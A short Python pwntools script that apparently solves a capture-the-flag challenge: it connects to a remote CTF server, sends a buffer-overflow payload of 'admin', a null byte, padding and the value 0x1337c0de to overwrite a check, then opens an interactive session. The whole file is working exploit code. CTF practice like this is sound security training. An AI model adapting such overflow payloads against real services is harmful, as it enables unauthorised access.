from pwn import *

#p = process("./app/chall")
p = remote("pwn.dctf.si", 13371)
#pid = gdb.attach(p, gdbscript="b* vuln")

mal = b'admin\0'
mal += b'A' * (44 - len(mal))
mal += p64(0x1337c0de)
p.sendline(mal)

p.interactive()
